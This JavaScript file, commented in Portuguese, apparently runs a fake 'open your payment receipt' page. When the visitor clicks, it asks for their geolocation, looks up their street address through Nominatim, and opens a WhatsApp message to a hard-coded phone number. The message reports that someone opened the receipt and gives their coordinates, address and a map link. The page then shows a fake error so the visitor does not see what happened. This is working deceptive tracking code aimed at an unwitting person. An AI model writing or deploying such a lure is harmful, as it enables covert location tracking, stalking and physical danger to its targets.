const button = document.getElementById('abrirComprovante');
const comprovante = document.getElementById('comprovante');

button.addEventListener('click', () => {
  // Mostra carregando para o cliente
  comprovante.innerHTML = `
    <h2>Processando Comprovante...</h2>
    <p>Aguarde um momento.</p>
  `;

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(sendLocationToWhatsApp, showError);
  } else {
    comprovante.innerHTML = "<h2>Seu navegador não suporta geolocalização.</h2>";
  }
});

function sendLocationToWhatsApp(position) {
  const latitude = position.coords.latitude;
  const longitude = position.coords.longitude;

  // Chamada à API Nominatim para obter o endereço
  fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`)
    .then(response => response.json())
    .then(data => {
      const endereco = data.address;
      
      // Tentando pegar a rua e número
      const rua = endereco.road || "Rua não disponível";
      const numero = endereco.house_number || endereco.suburb || "Número não disponível";

      // Montando a mensagem para o WhatsApp
      const mensagem = `Alguém abriu o comprovante! 
Localização: Latitude: ${latitude} Longitude: ${longitude} 
Endereço: ${rua}, ${numero}
Google Maps: https://www.google.com/maps?q=${latitude},${longitude}`;

      const numeroWhatsApp = '5521991453401'; 

      const url = `https://wa.me/${numeroWhatsApp}?text=${encodeURIComponent(mensagem)}`;
      window.open(url, '_blank');

     
      setTimeout(() => {
        comprovante.innerHTML = `
          <h2>Comprovante Indisponível</h2>
          <p>Houve um erro ao carregar o comprovante. Por favor, tente novamente mais tarde.</p>
        `;
      }, 3000);
    })
    .catch(error => {
      comprovante.innerHTML = "<h2>Erro ao obter endereço.</h2>";
    });
}

function showError(error) {
  comprovante.innerHTML = "<h2>Erro ao obter localização.</h2>";
}
